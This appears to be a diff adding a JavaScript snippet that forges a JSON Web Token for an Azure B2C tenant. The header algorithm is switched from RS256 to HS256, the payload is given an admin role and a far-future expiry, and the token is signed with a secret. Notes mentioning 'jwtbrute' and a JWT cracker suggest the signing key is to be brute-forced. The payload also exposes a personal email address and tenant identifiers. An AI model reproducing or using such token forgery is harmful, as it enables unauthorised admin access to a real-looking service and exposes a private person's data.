@@ -1,0 +1,34 @@
+
+RS256
+const header = {
+  alg: "HS256",
+  kid: "X5eXk4xyojNFum1kl2Ytv8dlNP4-c57dO6QGTVBwaNk",
+  typ: "JWT"
+};
+const payload = {
+  exp: 2731937304,
+  nbf: 1731933704,
+  ver: "1.0",
+  iss: "https://adiodevelopment.b2clogin.com/4a4315df-b919-4253-b74f-6e1d70d77b70/v2.0/",
+  sub: "e5ce0d28-f1b4-4183-bde1-557f9cebc600",
+  aud: "de5927fd-2d39-4540-ac14-0c8b386a5d10",
+  nonce: "01933eab-aa23-764c-a33c-e5e08fba6619",
+  iat: 1731933704,
+  auth_time: 1731923259,
+  oid: "e5ce0d28-f1b4-4183-bde1-557f9cebc600",
+  extension_account_id: "a488fc04-01e8-ee11-904c-000d3ae9d163",
+  extension_contact_id: "48aef4ea-00e8-ee11-904c-000d3ae9d163",
+  extension_ipa_id: "9af4d63f-3979-486d-9474-adf2e0b349f1",
+  extension_roles: "ipa_admin",
+  emails: ["hazimeh95@gmail.com"],
+  tfp: "B2C_1_ADIO_Dev"
+};
+const signOptions = {
+  algorithm: 'HS256', // Changed to match the header
+  header: header     // Include custom header
+};
+
+const token = jwt.sign(payload, SECRET_KEY, signOptions);
+HS256
+jwtbrute
+JWT cracker
